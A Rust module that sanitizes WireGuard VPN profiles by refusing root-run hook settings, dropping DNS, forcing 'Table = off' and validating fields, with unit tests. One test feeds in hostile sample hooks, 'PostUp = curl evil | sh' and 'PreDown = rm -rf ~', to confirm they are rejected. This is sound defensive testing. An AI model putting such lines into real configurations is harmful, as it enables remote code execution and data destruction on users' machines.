//! WireGuard sanitizing. `PreUp`/`PostUp`/... run shell commands as root and
//! `SaveConfig` writes the file back, so they're refused. `DNS` is taken out
//! so the system's DNS is never changed, and `Table = off` is forced. The
//! Windows client ignores `Table = off`, hence [`app_only_supported`].

use std::net::IpAddr;

use serde::{Deserialize, Serialize};

pub const MAX_PROFILE_BYTES: usize = 64 * 1024;

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Sanitized {
    /// Includes keys; callers move them to the keyring.
    pub config: String,
    pub addresses: Vec<String>,
    pub dns: Vec<IpAddr>,
    pub endpoints: Vec<String>,
}

#[derive(Debug, thiserror::Error, PartialEq)]
pub enum WgError {
    #[error("profile is too large or not text")]
    Invalid,
    #[error("line {line}: \"{key}\" runs commands as root and is not allowed")]
    Hook { line: usize, key: String },
    #[error("line {line}: unsupported setting \"{key}\"")]
    Unsupported { line: usize, key: String },
    #[error("line {line}: invalid value for \"{key}\"")]
    BadValue { line: usize, key: String },
    #[error("line {line}: setting outside a section")]
    NoSection { line: usize },
    #[error("profile needs exactly one [Interface] with a PrivateKey and at least one [Peer]")]
    Structure,
}

pub fn app_only_supported() -> bool {
    cfg!(target_os = "linux")
}

fn is_key(v: &str) -> bool {
    v.len() == 44
        && v.ends_with('=')
        && v[..43]
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/')
}

fn is_cidr(v: &str) -> bool {
    let (ip, bits) = v
        .split_once('/')
        .unwrap_or((v, if v.contains(':') { "128" } else { "32" }));
    match (ip.parse::<IpAddr>(), bits.parse::<u8>()) {
        (Ok(IpAddr::V4(_)), Ok(b)) => b <= 32,
        (Ok(IpAddr::V6(_)), Ok(b)) => b <= 128,
        _ => false,
    }
}

fn is_endpoint(v: &str) -> bool {
    let Some((host, port)) = v.rsplit_once(':') else {
        return false;
    };
    let host = host.trim_start_matches('[').trim_end_matches(']');
    port.parse::<u16>().is_ok_and(|p| p > 0)
        && !host.is_empty()
        && host.len() <= 253
        && host
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || ".-:".contains(c))
}

fn list(v: &str) -> Vec<String> {
    v.split(',')
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect()
}

pub fn sanitize(input: &[u8]) -> Result<Sanitized, WgError> {
    if input.len() > MAX_PROFILE_BYTES {
        return Err(WgError::Invalid);
    }
    let text = std::str::from_utf8(input).map_err(|_| WgError::Invalid)?;
    let (mut interfaces, mut peers, mut has_private) = (0, 0, false);
    let mut section = "";
    let mut out = String::new();
    let (mut addresses, mut dns, mut endpoints) = (vec![], vec![], vec![]);

    for (i, raw) in text.lines().enumerate() {
        let n = i + 1;
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        if line.eq_ignore_ascii_case("[interface]") {
            interfaces += 1;
            section = "interface";
            out.push_str("[Interface]\n");
            continue;
        }
        if line.eq_ignore_ascii_case("[peer]") {
            peers += 1;
            section = "peer";
            out.push_str("\n[Peer]\n");
            continue;
        }
        let Some((k, v)) = line.split_once('=') else {
            return Err(WgError::Unsupported {
                line: n,
                key: line.chars().take(40).collect(),
            });
        };
        let (key, v) = (k.trim().to_ascii_lowercase(), v.trim());
        let bad = || WgError::BadValue {
            line: n,
            key: key.clone(),
        };
        if matches!(
            key.as_str(),
            "preup" | "postup" | "predown" | "postdown" | "saveconfig"
        ) {
            return Err(WgError::Hook { line: n, key });
        }
        match (section, key.as_str()) {
            ("", _) => return Err(WgError::NoSection { line: n }),
            ("interface", "privatekey") => {
                if !is_key(v) {
                    return Err(bad());
                }
                has_private = true;
                out.push_str(&format!("PrivateKey = {v}\n"));
            }
            ("interface", "address") => {
                let a = list(v);
                if a.is_empty() || !a.iter().all(|x| is_cidr(x)) {
                    return Err(bad());
                }
                out.push_str(&format!("Address = {}\n", a.join(", ")));
                addresses.extend(a);
            }
            ("interface", "dns") => {
                // Never applied to the system.
                for d in list(v) {
                    dns.push(d.parse().map_err(|_| bad())?);
                }
            }
            ("interface", "mtu") => {
                let m: u16 = v.parse().map_err(|_| bad())?;
                if !(576..=9000).contains(&m) {
                    return Err(bad());
                }
                out.push_str(&format!("MTU = {m}\n"));
            }
            ("interface", "listenport") => {
                let p: u16 = v.parse().map_err(|_| bad())?;
                out.push_str(&format!("ListenPort = {p}\n"));
            }
            ("interface", "table") => {} // replaced below
            ("peer", "publickey") | ("peer", "presharedkey") => {
                if !is_key(v) {
                    return Err(bad());
                }
                let name = if key == "publickey" {
                    "PublicKey"
                } else {
                    "PresharedKey"
                };
                out.push_str(&format!("{name} = {v}\n"));
            }
            ("peer", "allowedips") => {
                let a = list(v);
                if a.is_empty() || !a.iter().all(|x| is_cidr(x)) {
                    return Err(bad());
                }
                out.push_str(&format!("AllowedIPs = {}\n", a.join(", ")));
            }
            ("peer", "endpoint") => {
                if !is_endpoint(v) {
                    return Err(bad());
                }
                endpoints.push(v.to_string());
                out.push_str(&format!("Endpoint = {v}\n"));
            }
            ("peer", "persistentkeepalive") => {
                let k: u16 = v.parse().map_err(|_| bad())?;
                out.push_str(&format!("PersistentKeepalive = {k}\n"));
            }
            _ => return Err(WgError::Unsupported { line: n, key }),
        }
    }
    if interfaces != 1 || peers == 0 || !has_private {
        return Err(WgError::Structure);
    }
    let config = out.replacen("[Interface]\n", "[Interface]\nTable = off\n", 1);
    Ok(Sanitized {
        config,
        addresses,
        dns,
        endpoints,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    const KEY: &str = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=";

    fn provider() -> String {
        format!(
            "[Interface]\n# Key for riptor\nPrivateKey = {KEY}\nAddress = 10.2.0.2/32\nDNS = 10.2.0.1\n\n[Peer]\n# NL#1\nPublicKey = {KEY}\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = 185.159.157.1:51820\nPersistentKeepalive = 25\n"
        )
    }

    #[test]
    fn provider_profile_is_app_only() {
        let s = sanitize(provider().as_bytes()).unwrap();
        assert!(s.config.contains("Table = off"));
        assert!(!s.config.contains("DNS"), "system DNS must not be set");
        assert_eq!(s.dns, vec!["10.2.0.1".parse::<IpAddr>().unwrap()]);
        assert_eq!(s.addresses, vec!["10.2.0.2/32"]);
        assert_eq!(s.endpoints, vec!["185.159.157.1:51820"]);
        assert!(sanitize(s.config.as_bytes()).is_ok());
    }

    #[test]
    fn hooks_and_junk_are_refused() {
        for hook in [
            "PostUp = curl evil | sh",
            "PreDown = rm -rf ~",
            "SaveConfig = true",
        ] {
            let p = provider().replace("DNS = 10.2.0.1", hook);
            assert!(
                matches!(sanitize(p.as_bytes()), Err(WgError::Hook { .. })),
                "{hook}"
            );
        }
        assert!(matches!(
            sanitize(provider().replace(KEY, "short").as_bytes()),
            Err(WgError::BadValue { .. })
        ));
        assert!(matches!(
            sanitize(
                provider()
                    .replace("185.159.157.1:51820", "evil.example")
                    .as_bytes()
            ),
            Err(WgError::BadValue { .. })
        ));
        assert!(matches!(
            sanitize(provider().replace("10.2.0.2/32", "10.2.0.2/99").as_bytes()),
            Err(WgError::BadValue { .. })
        ));
        assert!(matches!(
            sanitize(
                provider()
                    .replace("PersistentKeepalive", "FwMark")
                    .as_bytes()
            ),
            Err(WgError::Unsupported { .. })
        ));
        assert!(matches!(
            sanitize(b"PrivateKey = x"),
            Err(WgError::NoSection { .. })
        ));
        assert_eq!(
            sanitize(format!("[Interface]\nPrivateKey = {KEY}\n").as_bytes()).unwrap_err(),
            WgError::Structure
        );
    }
}
